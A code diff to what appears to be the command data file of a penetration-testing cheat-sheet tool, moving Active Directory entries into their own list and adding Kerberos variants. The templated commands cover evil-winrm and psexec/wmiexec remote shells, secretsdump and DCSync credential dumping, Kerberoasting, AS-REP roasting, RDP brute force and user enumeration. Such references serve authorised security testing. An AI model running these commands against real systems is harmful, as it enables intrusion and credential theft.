@@ -759,8 +759,28 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["linux","mac","kerberos"]
 },
 {
+"name": "winrm password",
+"command": "evil-winrm -i {ip} -u {user} -p \"{password}\"",
+"meta": ["linux","mac","windows"]
+},
+{
+"name": "winrm password (kerberos)",
+"command": "evil-winrm -i {ip} -u {user} -p \"{password}\" -r {adDomain}",
+"meta": ["linux","mac","windows","kerberos"]
+},
+{
 "name": "rdp brute",
 "command": "hydra -t 4 -V -f -L users.txt -P passwords.txt rdp://{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "nmap smb os",
+"command": "nmap --script smb-os-discovery.nse -p445 {ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "nmap smb vuln",
+"command": "nmap --script=smb-vuln* -p139,445 {ip}",
 "meta": ["linux","mac"]
 },
 {
@@ -789,9 +809,24 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["linux","mac"]
 },
 {
+"name": "smbclient put (kerberos)",
+"command": "smbclient \\{ip}\{share} -U '{user}%{password}' -k -c 'put {local} {remote}'",
+"meta": ["linux","mac","kerberos"]
+},
+{
 "name": "smbclient auth null",
 "command": "smbclient -N \\{ip}\IPC$ -c 'srvinfo'",
 "meta": ["linux","mac"]
+},
+{
+"name": "rpcclient null",
+"command": "rpcclient -U \"\" -N {ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "rpcclient (kerberos)",
+"command": "rpcclient -k {ip}",
+"meta": ["linux","mac","kerberos"]
 },
 {
 "name": "smbmap enum",
@@ -799,9 +834,19 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["linux","mac"]
 },
 {
+"name": "smbmap enum (kerberos)",
+"command": "smbmap -H {ip} -d {domain} -u {user} -k",
+"meta": ["linux","mac","kerberos"]
+},
+{
 "name": "smbmap upload",
 "command": "smbmap -H {ip} -u {user} -p '{password}' -d {domain} -R '{share}' –upload '{local}:{remote}'",
 "meta": ["linux","mac"]
+},
+{
+"name": "smbmap upload (kerberos)",
+"command": "smbmap -H {ip} -d {domain} -u {user} -k -R '{share}' –upload '{local}:{remote}'",
+"meta": ["linux","mac","kerberos"]
 },
 {
 "name": "winrm exec",
@@ -869,9 +914,19 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["linux","mac"]
 },
 {
+"name": "getsecrets (kerberos)",
+"command": "secretsdump.py -k -no-pass {domain}/{user}@{ip} -outputfile {outfile}",
+"meta": ["linux","mac","kerberos"]
+},
+{
 "name": "dcsync impacket",
 "command": "secretsdump.py -just-dc -outputfile dcsync {domain}/{user}:{password}@{ip}",
 "meta": ["linux","mac"]
+},
+{
+"name": "dcsync impacket (kerberos)",
+"command": "secretsdump.py -k -no-pass -just-dc {domain}/{user}@{ip}",
+"meta": ["linux","mac","kerberos"]
 },
 {
 "name": "dcsync mimikatz",
@@ -909,6 +964,16 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["windows"]
 },
 {
+"name": "wmiexec impacket",
+"command": "python3 /usr/share/doc/python3-impacket/examples/wmiexec.py {domain}/{user}:\"{password}\"@{ip} \"hostname\"",
+"meta": ["linux","mac"]
+},
+{
+"name": "wmiexec impacket (kerberos)",
+"command": "python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass {domain}/{user}@{ip} \"hostname\"",
+"meta": ["linux","mac","kerberos"]
+},
+{
 "name": "wmic process create",
 "command": "wmic /node:{ip} process call create 'cmd.exe /c {cmd}'",
 "meta": ["windows"]
@@ -919,9 +984,19 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["linux","mac"]
 },
 {
+"name": "psexec smbexec (kerberos)",
+"command": "psexec.py -k -no-pass {domain}/{user}@{ip}",
+"meta": ["linux","mac","kerberos"]
+},
+{
 "name": "smbexec impacket",
 "command": "smbexec.py {domain}/{user}:{password}@{ip}",
 "meta": ["linux","mac"]
+},
+{
+"name": "smbexec impacket (kerberos)",
+"command": "smbexec.py -k -no-pass {domain}/{user}@{ip}",
+"meta": ["linux","mac","kerberos"]
 },
 {
 "name": "atp harvest",
@@ -1031,6 +1106,51 @@ const activeDirectoryCommands = withCommandType(
 {
 "name": "docker exec",
 "command": "docker exec -it {container} /bin/sh",
+"meta": ["linux","mac"]
+},
+{
+"name": "ldap anonymous",
+"command": "ldapsearch -x -H ldap://{ip} -s base",
+"meta": ["linux","mac"]
+},
+{
+"name": "ldap anonymous (kerberos)",
+"command": "ldapsearch -Y GSSAPI -H ldap://{fqdn} -b \"\" -s base",
+"meta": ["linux","mac","kerberos"]
+},
+{
+"name": "ldapdomaindump",
+"command": "ldapdomaindump ldap://{ip} --no-json -d {domain}",
+"meta": ["linux","mac"]
+},
+{
+"name": "ldapdomaindump (kerberos)",
+"command": "ldapdomaindump ldap://{fqdn} -k -u '{domain}\\\\{user}'",
+"meta": ["linux","mac","kerberos"]
+},
+{
+"name": "kerbrute userenum",
+"command": "kerbrute userenum --dc {ip} -d {domain} users.txt",
+"meta": ["linux","mac"]
+},
+{
+"name": "getuserspns",
+"command": "GetUserSPNs.py {domain}/{user}:{password}@{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "getuserspns (kerberos)",
+"command": "GetUserSPNs.py -k -no-pass {domain}/{user}@{ip}",
+"meta": ["linux","mac","kerberos"]
+},
+{
+"name": "asrep roast",
+"command": "GetNPUsers.py {domain}/ -no-pass -usersfile users.txt -dc-ip {ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "o365spray validate",
+"command": "python3 o365spray.py --validate --domain {domain}",
 "meta": ["linux","mac"]
 },
 {
@@ -1185,16 +1305,6 @@ const commonServiceCommands = withCommandType(
     "meta": ["windows"]
   },
   {
-    "name": "evil winrm",
-    "command": "evil-winrm -i {ip} -u {user} -p \"{password}\"",
-    "meta": ["linux", "mac", "windows"]
-  },
-  {
-    "name": "wmiexec example",
-    "command": "python3 /usr/share/doc/python3-impacket/examples/wmiexec.py {user}:\"{password}\"@{ip} \"hostname\"",
-    "meta": ["linux", "mac"]
-  },
-  {
     "name": "ftp anonymous",
     "command": "ftp -p {ip}",
     "meta": ["linux", "mac", "windows"]
@@ -1212,21 +1322,6 @@ const commonServiceCommands = withCommandType(
   {
     "name": "hydra ftp",
     "command": "hydra -L users.list -P passwords.list ftp://{ip}:{port} -t 64",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "nmap smb os",
-    "command": "nmap --script smb-os-discovery.nse -p445 {ip}",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "nmap smb vuln",
-    "command": "nmap --script=smb-vuln* -p139,445 {ip}",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "rpcclient null",
-    "command": "rpcclient -U \"\" -N {ip}",
     "meta": ["linux", "mac"]
   },
   {
@@ -1280,11 +1375,6 @@ const commonServiceCommands = withCommandType(
     "meta": ["linux", "mac"]
   },
   {
-    "name": "o365spray validate",
-    "command": "python3 o365spray.py --validate --domain {domain}",
-    "meta": ["linux", "mac"]
-  },
-  {
     "name": "snmpwalk",
     "command": "snmpwalk -v2c -c public {ip}",
     "meta": ["linux", "mac"]
@@ -1332,31 +1422,6 @@ const commonServiceCommands = withCommandType(
   {
     "name": "ipmitool chassis",
     "command": "ipmitool -I lanplus -H {ip} -U {user} -P {password} chassis power status",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "ldap anonymous",
-    "command": "ldapsearch -x -H ldap://{ip} -s base",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "ldapdomaindump",
-    "command": "ldapdomaindump ldap://{ip} --no-json -d {domain}",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "kerbrute userenum",
-    "command": "kerbrute userenum --dc {ip} -d {domain} users.txt",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "getuserspns",
-    "command": "GetUserSPNs.py {domain}/{user}:{password}@{ip}",
-    "meta": ["linux", "mac"]
-  },
-  {
-    "name": "asrep roast",
-    "command": "GetNPUsers.py {domain}/ -no-pass -usersfile users.txt -dc-ip {ip}",
     "meta": ["linux", "mac"]
   },
   {
